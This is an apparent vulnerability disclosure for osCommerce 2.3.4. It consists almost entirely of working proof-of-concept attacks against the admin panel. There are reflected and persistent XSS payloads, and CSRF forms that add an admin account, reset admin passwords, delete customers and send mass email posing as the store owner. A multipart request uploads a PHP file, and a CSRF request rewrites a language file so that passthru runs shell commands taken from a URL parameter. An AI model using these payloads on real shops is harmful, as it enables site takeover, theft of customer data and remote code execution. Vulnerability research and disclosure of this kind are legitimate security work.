#Date: 10.07.14
#Affected versions: => 2.3.4 (latest atm)
#Vendor: oscommerce.com
#Tested on: Apache 2.2.22 [at] Debian
#Contact: smash [at] devilteam.pl

#Cross Site Scripting

 1. Reflected XSS -> Send Email

Vulnerable parameters - customers_email_address & mail_sent_to

a) POST

Request:
Host: localhost

customers_email_address=<script>alert(666)</script>&from=fuck@shit.up&subject=test&message=test

Response:
HTTP/1.1 200 OK
(...)
<td class="smallText"><strong>Customer:</strong><br /><script>alert(666)</script></td>
</tr>
(...)

CSRF PoC:
<html>
  <body>
      <input type="hidden" name="customers&#95;email&#95;address" value="<script>alert&#40;666&#41;<&#47;script>" />
      <input type="hidden" name="from" value="fuck&#64;shit&#46;up" />
      <input type="hidden" name="subject" value="test" />
      <input type="hidden" name="message" value="test" />
      <input type="submit" value="Go" />
    </form>
  </body>
</html>

b) GET

Request:
GET /osc/oscommerce-2.3.4/catalog/admin/mail.php?mail_sent_to=%3Cscript%3Ealert(666)%3C/script%3E HTTP/1.1
Host: localhost

Response:
(...)
<td class="messageStackSuccess"><img src="images/icons/success.gif" border="0" alt="Success" title="Success" />&nbps;Notice: Email sent to: <script>alert(666)</script></td>
</tr>
(...)


 2. Persistent XSS via CSRF -> Newsletter

Request:
POST /osc/oscommerce-2.3.4/catalog/admin/newsletters.php?action=insert HTTP/1.1
Host: localhost

module=newsletter&title=<script>alert(123)</script>&content=<script>alert(456)</script>

CSRF PoC:
<html>
  <body>
    <form action="http://localhost/osc/oscommerce-2.3.4/catalog/admin/newsletters.php?action=insert" method="POST">
      <input type="hidden" name="module" value="newsletter" />
      <input type="hidden" name="title" value="<script>alert&#40;123&#41;<&#47;script>" />
      <input type="hidden" name="content" value="<script>alert&#40;456&#41;<&#47;script>" />
      <input type="submit" value="Go" />
    </form>
  </body>
</html>

First popbox (123) will be executed whenever someone will visit newsletters page:
localhost/osc/oscommerce-2.3.4/catalog/admin/newsletters.php

(...)
(...)
<tr class="infoBoxHeading">
<td class="infoBoxHeading"><strong><script>alert(123)</script></strong></td>
</tr>
(...)

Second one, will be executed whenever someone will visit specific newsletter page:

(...)
<tr>
<td><tt><script>alert(456)</script></tt></td>
</tr>
<tr>
(...)

3. Persistent XSS via CSRF -> Banner manager

Vulnerable parameter - banners_title

PoC:
<html>
  <body>
    <script>
      function go()
      {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "http://localhost/osc/oscommerce-2.3.4/catalog/admin/banner_manager.php?action=insert", true);
        xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
        xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=---------------------------19390593192018454503847724432");
        xhr.withCredentials = true;
        var body = "-----------------------------19390593192018454503847724432\r\n" + 
          "Content-Disposition: form-data; name=\"banners_title\"\r\n" + 
          "\r\n" + 
          "\x3cscript\x3ealert(666)\x3c/script\x3e\r\n" + 
          "-----------------------------19390593192018454503847724432\r\n" + 
          "Content-Disposition: form-data; name=\"banners_url\"\r\n" + 
          "\r\n" + 
          "url\r\n" + 
          "-----------------------------19390593192018454503847724432\r\n" + 
          "Content-Disposition: form-data; name=\"banners_group\"\r\n" + 
          "\r\n" + 
          "footer\r\n" + 
          "-----------------------------19390593192018454503847724432\r\n" + 
          "Content-Disposition: form-data; name=\"new_banners_group\"\r\n" + 
          "\r\n" + 
          "group\r\n" + 
          "-----------------------------19390593192018454503847724432\r\n" + 
          "Content-Disposition: form-data; name=\"banners_image\"; filename=\"info.gif\"\r\n" + 
          "Content-Type: application/x-php\r\n" + 
          "\r\n" + 
          "\x3c?php\n" + 
          "phpinfo();\n" + 
          "?\x3e\n" + 
          "\r\n" + 
          "-----------------------------19390593192018454503847724432\r\n" + 
          "Content-Disposition: form-data; name=\"banners_image_local\"\r\n" + 
          "\r\n" + 
          "\r\n" + 
          "-----------------------------19390593192018454503847724432\r\n" + 
          "Content-Disposition: form-data; name=\"banners_image_target\"\r\n" + 
          "\r\n" + 
          "\r\n" + 
          "-----------------------------19390593192018454503847724432\r\n" + 
          "Content-Disposition: form-data; name=\"banners_html_text\"\r\n" + 
          "\r\n" + 
          "sup\r\n" + 
          "-----------------------------19390593192018454503847724432\r\n" + 
          "Content-Disposition: form-data; name=\"date_scheduled\"\r\n" + 
          "\r\n" + 
          "2014-07-01\r\n" + 
          "-----------------------------19390593192018454503847724432\r\n" + 
          "Content-Disposition: form-data; name=\"expires_date\"\r\n" + 
          "\r\n" + 
          "2014-07-31\r\n" + 
          "-----------------------------19390593192018454503847724432\r\n" + 
          "\r\n" + 
          "\r\n" + 
          "-----------------------------19390593192018454503847724432--\r\n";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i); 
        xhr.send(new Blob([aBody]));
      }
    </script>
    <form action="#">
      <input type="button" value="Go" onclick="go();" />
    </form>
  </body>
</html>

JS will be executed whenever someone will visitd banner manager page or specific banner page.

localhost/osc/oscommerce-2.3.4/catalog/admin/banner_manager.php
localhost/osc/oscommerce-2.3.4/catalog/admin/banner_manager.php?page=1&bID=[ID]

Response:
<td class="dataTableContent"><a href="javascript:popupImageWindow(&#039;popup_image.php?banner=3&#039;)"><img src="images/icon_popup.gif" border="0" alt="View Banner" title="View Banner" /></a>&nbps;<script>alert(666)</script></td>
<td class="dataTableContent" align="right">group</td>


 4. Persistent XSS via CSRF -> Locations / Taxes

Countries tab is taken as example, but same vulnerability affects other tabs in &#039;Locations / Taxes&#039;, namely Tax Classes, Tax Rates, Tax Zones and Zones.

 PoC:
 <html>
  <body>
    <form action="http://localhost/osc/oscommerce-2.3.4/catalog/admin/countries.php?page=1&action=insert" method="POST">
      <input type="hidden" name="countries&#95;name" value="AAAA<script>alert&#40;666&#41;<&#47;script>" />
      <input type="hidden" name="countries&#95;iso&#95;code&#95;2" value="xs" />
      <input type="hidden" name="countries&#95;iso&#95;code&#95;3" value="sed" />
      <input type="hidden" name="address&#95;format&#95;id" value="1" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

JS will be executed whenever someone will visitd &#039;countries&#039; tab:
localhost/osc/oscommerce-2.3.4/catalog/admin/countries.php

Response:
(...)
<tr id="defaultSelected" class="dataTableRowSelected" onmouseover="rowOverEffect(this)" onmouseout="rowOutEffect(this)" onclick="document.location.href=&#039;http://localhost/osc/oscommerce-2.3.4/catalog/admin/countries.php?page=1&cID=241&action=edit&#039;">
<td class="dataTableContent">AAAA<script>alert(666)</script></td>
<td class="dataTableContent" align="center" width="40">xs</td>
<td class="dataTableContent" align="center" width="40">sed</td>
(...)

 5. Persistent XSS via CSRF -> Localization

 a) Currencies

PoC:
<html>
  <body>
    <form action="http://localhost/osc/oscommerce-2.3.4/catalog/admin/currencies.php?page=1&action=insert" method="POST">
      <input type="hidden" name="cs" value="" />
      <input type="hidden" name="title" value="<script>alert&#40;666&#41;<&#47;script>" />
      <input type="hidden" name="code" value="666" />
      <input type="hidden" name="symbol&#95;left" value="hm" />
      <input type="hidden" name="symbol&#95;right" value="mh" />
      <input type="hidden" name="decimal&#95;point" value="10" />
      <input type="hidden" name="thousands&#95;point" value="100" />
      <input type="hidden" name="decimal&#95;places" value="10000" />
      <input type="hidden" name="value" value="666&quot;><script>alert&#40;123&#41;<&#47;script>" />
      <input type="hidden" name="default" value="on" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

JS will be executed whenever someone will visit currencies tab:
localhost/osc/oscommerce-2.3.4/catalog/admin/currencies.php

Response:
(...)
<tr id="defaultSelected" class="dataTableRowSelected" onmouseover="rowOverEffect(this)" onmouseout="rowOutEffect(this)" onclick="document.location.href=&#039;http://localhost/osc/oscommerce-2.3.4/catalog/admin/currencies.php?page=1&cID=3&action=edit&#039;">
<td class="dataTableContent"><strong><script>alert(666)</script> (default)</strong></td>
<td class="dataTableContent">666</td>
<td class="dataTableContent" align="right">666.00000000</td>
(...)
 
 b) Languages

PoC:
<html>
  <body>
    <form action="http://localhost/osc/oscommerce-2.3.4/catalog/admin/languages.php?action=insert" method="POST">
      <input type="hidden" name="name" value="&quot;><script>alert&#40;666&#41;<&#47;script>" />
      <input type="hidden" name="code" value="h3ll" />
      <input type="hidden" name="image" value="icon&#46;gif" />
      <input type="hidden" name="directory" value="asdf" />
      <input type="hidden" name="sort&#95;order" value="asdf" />
      <input type="hidden" name="default" value="on" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

JS will be executed whenever someone will visit langauges tab:
localhost/osc/oscommerce-2.3.4/catalog/admin/languages.php

Response:
(...)
<tr id="defaultSelected" class="dataTableRowSelected" onmouseover="rowOverEffect(this)" onmouseout="rowOutEffect(this)" onclick="document.location.href=&#039;http://localhost/osc/oscommerce-2.3.4/catalog/admin/languages.php?page=1&lID=2&action=edit&#039;">
<td class="dataTableContent"><script>alert(666)</script></td>
<td class="dataTableContent">66</td>
(...)

 c) Orders status

Request:
POST /osc/oscommerce-2.3.4/catalog/admin/orders_status.php?page=1&action=insert HTTP/1.1
Host: localhost

orders_status_name%5B2%5D=%27%3E%22%3E%3C%3EXSS&orders_status_name%5B3%5D=%27%3E%22%3E%3C%3EXSS&orders_status_name%5B4%5D=%27%3E%22%3E%3C%3EXSS&orders_status_name%5B5%5D=%27%3E%22%3E%3C%3EXSS&orders_status_name%5B6%5D=%27%3E%22%3E%3C%3EXSS&orders_status_name%5B7%5D=%27%3E%22%3E%3C%3EXSS&orders_status_name%5B1%5D=%27%3E%22%3E%3C%3EXSS

Response:
(...)
<td class="dataTableContent">&#039;>"><>XSS</td>
(...)
<td class="infoBoxHeading"><strong>&#039;>"><>XSS</strong></td>
(...)
<td class="infoBoxContent"><br /><img src="http://localhost/osc/oscommerce-2.3.4/catalog/includes/languages/asdf/images/icon.gif" border="0" alt="<script>alert(666)</script>" title="<script>alert(666)</script>" />&nbps;&#039;>"><>XSS<br /><img src="http://localhost/osc/oscommerce-2.3.4/catalog/includes/languages/asdf/images/icon.gif" border="0" alt="&quot;><script>alert(666)</script>" title="&quot;><script>alert(666)</script>" />&nbps;&#039;>"><>XSS<br /><img src="http://localhost/osc/oscommerce-2.3.4/catalog/includes/languages/asdf&#039;>&quot;><>XSS/images/icon.gif&#039;>&quot;><>XSS" border="0" alt="&quot;><script>alert(666)</script>" title="&quot;><script>alert(666)</script>" />&nbps;&#039;>"><>XSS<br /><img src="http://localhost/osc/oscommerce-2.3.4/catalog/includes/languages/asdf/images/icon.gif&#039;>&quot;><>XSS" border="0" alt="&quot;><script>alert(666)</script>" title="&quot;><script>alert(666)</script>" />&nbps;&#039;>"><>XSS<br /><img src="http://localhost/osc/oscommerce-2.3.4/catalog/includes/languages/asdf/images/icon.gif" border="0" alt="&quot;><script>alert(666)</script>" title="&quot;><script>alert(666)</script>" />&nbps;&#039;>"><>XSS<br /><img src="http://localhost/osc/oscommerce-2.3.4/catalog/includes/languages/asdf/images/icon.gif&#039;>&quot;><>XSS" border="0" alt="&quot;><script>alert(666)</script>" title="&quot;><script>alert(666)</script>" />&nbps;&#039;>"><>XSS<br /><img src="http://localhost/osc/oscommerce-2.3.4/catalog/includes/languages/english/images/icon.gif" border="0" alt="English" title="English" />&nbps;&#039;>"><>XSS</td>
  </tr>



#Boring CSRF

 - Remove any item from cart

localhost/osc/oscommerce-2.3.4/catalog/shopping_cart.php?products_id=[ID]&action=remove_product

 - Add item to cart

localhost/osc/oscommerce-2.3.4/catalog/product_info.php?products_id=[ID]&action=add_product

 - Remove address book entry

localhost/osc/oscommerce-2.3.4/catalog/address_book_process.php?delete=1

 - Remove specific country

localhost/osc/oscommerce-2.3.4/catalog/admin/countries.php?page=1&cID=1&action=deleteconfirm

 - Remove specific currency

localhost/osc/oscommerce-2.3.4/catalog/admin/currencies.php?page=1&cID=[ID]&action=deleteconfirm

 - Change store credentials

I&#039;m to bored to craft another request&#039;s, whole &#039;Configuration&#039; & &#039;Catalog&#039; panel suffers on CSRF.

localhost/osc/oscommerce-2.3.4/catalog/admin/configuration.php

...and a lot more.



#Less boring CSRF

 - Send email as admin -> Send email

It is able to send email to specific user, newsletter subscribers and all of them. In this case, &#039;***&#039; stands for sending mail to all customers.

<html>
  <body>
    <form action="http://localhost/osc/oscommerce-2.3.4/catalog/admin/mail.php?action=send_email_to_user" method="POST">
      <input type="hidden" name="customers&#95;email&#95;address" value="&#42;&#42;&#42;" />
      <input type="hidden" name="from" value="&quot;storeowner&quot;&#32;<storemail&#64;lol&#46;lo>" />
      <input type="hidden" name="subject" value="subject" />
      <input type="hidden" name="message" value="sup" />
      <input type="submit" value="Go" />
    </form>
  </body>
</html>

 - Delete / Edit specific user

Remove user PoC:
localhost/osc/oscommerce-2.3.4/catalog/admin/customers.php?page=1&cID=1&action=deleteconfirm

Edit user PoC:
<html>
  <body>
    <form action="http://localhost/osc/oscommerce-2.3.4/catalog/admin/customers.php?page=1&cID=1&action=update" method="POST">
      <input type="hidden" name="default&#95;address&#95;id" value="1" />
      <input type="hidden" name="customers&#95;gender" value="m" />
      <input type="hidden" name="customers&#95;firstname" value="juster" />
      <input type="hidden" name="customers&#95;lastname" value="testing" />
      <input type="hidden" name="customers&#95;dob" value="07&#47;13&#47;2004" />
      <input type="hidden" name="customers&#95;email&#95;address" value="szit&#64;szit&#46;szit" />
      <input type="hidden" name="entry&#95;company" value="asdf" />
      <input type="hidden" name="entry&#95;street&#95;address" value="asdfasdf" />
      <input type="hidden" name="entry&#95;suburb" value="asdfsdff" />
      <input type="hidden" name="entry&#95;postcode" value="66&#45;666" />
      <input type="hidden" name="entry&#95;city" value="asdfasdf" />
      <input type="hidden" name="entry&#95;state" value="asdfasdfasdf" />
      <input type="hidden" name="entry&#95;country&#95;id" value="5" />
      <input type="hidden" name="customers&#95;telephone" value="123456792" />
      <input type="hidden" name="customers&#95;fax" value="" />
      <input type="hidden" name="customers&#95;newsletter" value="1" />
      <input type="submit" value="Go" />
    </form>
  </body>
</html>

 - Add / Edit / Delete admin

Add admin account:
<html>
  <body>
    <form action="http://localhost/osc/oscommerce-2.3.4/catalog/admin/administrators.php?action=insert" method="POST">
      <input type="hidden" name="username" value="haxor" />
      <input type="hidden" name="password" value="pwned" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

Change admin (set new password):
<html>
  <body>
    <form action="http://localhost/osc/oscommerce-2.3.4/catalog/admin/administrators.php?aID=1&action=save" method="POST">
      <input type="hidden" name="username" value="admin" />
      <input type="hidden" name="password" value="newpass" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

Remove admin:
localhost/osc/oscommerce-2.3.4/catalog/admin/administrators.php?aID=2&action=deleteconfirm


 - RCE via CSRF -> Define Languages

It is able to change content of specific file in &#039;define languages&#039; tab, we&#039;re gonna use default english language, and so default files path. File MUST be writable. Value stands for english.php default content; as you can notice, passthru function is being included.

localhost/osc/oscommerce-2.3.4/catalog/includes/languages/english.php?cmd=uname -a

PoC:
<html>
  <body>
    <form action="http://localhost/osc/oscommerce-2.3.4/catalog/admin/define_language.php?lngdir=english&filename=english.php&action=save" method="POST">
      <input type="submit" value="Go" />
    </form>
  </body>
</html>

